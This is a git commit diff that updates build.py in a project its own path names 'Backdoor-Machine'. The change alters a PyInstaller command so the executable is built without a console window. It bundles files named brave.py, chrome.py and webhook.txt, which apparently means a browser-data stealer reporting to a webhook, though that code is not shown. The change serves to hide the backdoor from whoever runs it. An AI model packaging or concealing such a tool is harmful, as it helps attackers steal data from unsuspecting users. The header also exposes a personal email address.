f25d5e28a4318e6c95fab69cc60ab5e46e473004
CUPZYY <richbanana1234@gmail.com>
2021-04-27 19:27:40 +0200

    Update build.py

--- build.py
+++ build.py
@@ -3,5 +3,5 @@ import subprocess
 
 filePath = str(pathlib.Path(__file__).parent.absolute())
 
-subprocess.call("pyinstaller --noconfirm --onefile --console --add-data \"brave.py;.\" --add-data \"chrome.py;.\" --add-data \"webhook.txt;.\" --clean --hidden-import \"win32api\" \"main.py\"", shell=True)
+subprocess.call("pyinstaller --noconfirm --onefile --windowed --add-data \"brave.py;.\" --add-data \"chrome.py;.\" --add-data \"webhook.txt;.\" --clean --hidden-import \"win32api\" \"main.py\"", shell=True)
 # pyinstaller --noconfirm --onefile --console --add-data "C:/Users/CUPZYY/Documents/Python Projects/Backdoor-Machine/brave.py;." --add-data "C:/Users/CUPZYY/Documents/Python Projects/Backdoor-Machine/chrome.py;." --add-data "C:/Users/CUPZYY/Documents/Python Projects/Backdoor-Machine/webhook.txt;." --hidden-import "win32api"  "C:/Users/CUPZYY/Documents/Python Projects/Backdoor-Machine/main.py"
